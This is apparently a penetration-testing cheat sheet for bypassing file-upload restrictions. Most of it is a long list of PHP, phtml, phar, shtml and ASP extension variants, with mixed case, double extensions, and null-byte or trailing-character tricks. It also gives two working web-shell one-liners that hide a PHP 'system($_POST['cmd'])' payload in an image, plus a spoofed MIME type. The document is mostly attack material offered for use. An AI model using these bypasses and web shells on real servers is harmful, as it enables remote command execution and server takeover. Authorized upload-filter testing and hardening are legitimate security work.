# **uploadfile-extensionbypass**  
**Common Extension File Upload Bypass**  
```
file.php
file.PhTmL
file.php2
file.php3
file.php4
file.php5
file.php6
file.php7
file.phps
file.pht
file.phtm
file.phtml
file.pgif
file.shtml
file.htaccess
file.phar
file.inc
file.hphp
file.ctp
file.module
file.cgi
file.pl
file.py
file.pyc
file.pyo
file.php3
file.php4
file.php5
file.php6
file.pcgi
file.pcgi3
file.pcgi4
file.pcgi5
file.pchi6
file.Php
file.pHp
file.phP
file.PHp
file.pHP
file.PhP
file.PHP
file.PhP5
file.php5
file.PhP5
file.phar
file.PHAR
file.Phar
file.PHar
file.PHAr
file.pHAR
file.phAR
file.phaR
file.pHp5
file.phP5
file.PHp5
file.pHP5
file.PhP5
file.PHP5
file.php6
file.php7
file.php8
file.php9
file.phtml
file.Phtml
file.pHtml
file.phTml
file.pHTml
file.Fla
file.fLa
file.flA
file.FLa
file.fLA
file.FlA
file.FLA
file.phtMl
file.phtmL
file.PHtml
file.PhTml
file.PHTML
file.PHTml
file.PHTMl
file.PhtMl
file.PHTml
file.PHtML
file.pHTMl
file.PhTML
file.pHTML
file.PhtmL
file.PHTmL
file.PhtMl
file.PhtmL
file.pHtMl
file.PhTmL
file.pHtmL
file.aspx
file.ASPX
file.asp
file.ASP
file.php.jpg
file.PHP.JPG
file.php.xxxjpg
file.PHP.XXXJPG
file.php.jpeg
file.PHP.JPG
file.PHP.JPEG
file.PHP.PJEPG
file.php.pjpeg
file.php.fla
file.PHP.FLA
file.php.png
file.PHP.PNG
file.php.gif
file.PHP.GIF
file.php.test
file.php;.jpg
file.PHP JPG
file.PHP;.JPG
file.php;.jpeg
file.php jpg
file.php.bak
file.php.pdf
file.php.xxxpdf
file.php.xxxpng
file.fla
file.Fla
file.fLa
file.fLa
file.flA
file.FLa
file.fLA
file.FLA
file.FlA
file.php.xxxgif
file.php.xxxpjpeg
file.php.xxxjpeg
file.php3.xxxjpeg
file.php3.xxxjpg
file.php5.xxxjpg
file.php3.pjpeg
file.php5.pjpeg
file.shtml
file.php.unknown
file.php.doc
file.php.docx
file.php.pdf
file.php.ppdf
file.jpg.PhP
file.php.txt
file.php.xxxtxt
file.PHP.TXT
file.PHP.XXXTXT
file.php.xlsx
file.php.zip
file.php.xxxzip
file.php78
file.php56
file.php96
file.php69
file.php67
file.php68
file.php4
file.shtMl
file.shtmL
file.SHhtml
file.ShTml
file.SHTML
file.SHTml
file.SHTMl
file.ShtMl
file.SHTml
file.SHtML
file.sHTMl
file.ShTML
file.sHTML
file.ShtmL
file.SHTmL
file.ShtMl
file.ShtmL
file.sHtMl
file.ShTmL
file.sHtmL
file.Shtml
file.sHtml
file.shTml
file.sHTml
file.shtml
file.php1
file.php2
file.php3
file.php4
file.php10
file.suspected
file.py
file.exe
file.alfa
```

---

**Bypass Magic Number**  
```
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

---

**Bypass Mime_Type**  
```
application/x-httpd-php
```

---

**Unrestricted File Upload Trick**  
```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.php....
file.pHp5....
```

```
file.png.php
file.png.pHp5
file.php#.png
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
file.phpJunk123png
```

```
file.png.jpg.php
file.php%00.png%00.jpg
```

